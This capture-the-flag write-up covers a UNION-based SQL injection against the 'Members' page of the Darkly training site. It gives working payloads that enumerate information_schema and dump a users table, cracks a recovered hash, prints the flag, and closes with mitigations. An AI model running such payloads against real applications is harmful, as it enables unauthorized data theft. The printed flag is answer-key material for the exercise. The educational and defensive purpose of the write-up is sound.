# SQL Injection - Members

## Definition

Listed among the OWASP top 10 Web Application Security, an injection "occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization." (OWASP)

More precisely an SQL injection will trick an SQL interpreter.

## Some use cases

* accessing sensitive data and stealing / corrupting / deleting 
* injecting data
* taking host over
* denial of service

## Exploit on Darkly

### Context
On the `Members` part of the site we are asked to enter a member `ID`. The query outputs 3 fields:
	* the `ID` we made the query on
	* `First Name`
	* `Surname`

### Solution
As there is a potential SQL injection weakness, we do the following:

1. Trying to know how many columns there are in the original query (see below for the explanation about those commands): 
	* `1 UNION SELECT 1` outputs `The used SELECT statements have a different number of columns`
	* `1 UNION SELECT 1, 2` works fine so we guess there are two columns

2. Get the tables schema and names:
	* `1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables`

3. Get the tables columns:
	* `1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns`

4. Combining all the information we got from those queries, we discover that there is a `users` table with some potentially interesting columns:
	* `1 AND 1=2 UNION SELECT first_name, last_name FROM Member_Sql_Injection.users` outputs, for one of the users, `Flag` and `GetThe`
	* `1 AND 1=2 UNION SELECT countersign, commentaire FROM Member_Sql_Injection.users` outputs, for that same user, `5ff9d0165b4f92b14994e5c685cdce28` and `Decrypt this password -> then lower all the char. Sh256 on it and it's good !`

5. Following the instructions above:
	* we decrypt the hash on [dcode](https://www.dcode.fr/fonction-hash#f0), what outputs `FortyTwo`
	* on the same website, we hash (shasum 256) `fortytwo`, what outputs `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`


### More details about the SQL commands

* `UNION` is a command that allows to concatenate the results of two different queries. The two queries must have the same number of columns
* `AND 1=2` is a condition that makes the first query always `false`: it won't output anything and we will gain readability

## Some ways to avoid it

* never trust the user inputs : validate / filter / sanitize the data sent to the site:
	* in our example, check that the user input is only an integer
	* for other queries (for example involving strings), escape all the special chars
	* set a whitelist of accepted characters
* in case the injection succeeds:
	* use control commands like `LIMIT` in SQL
	* use principle of least privilege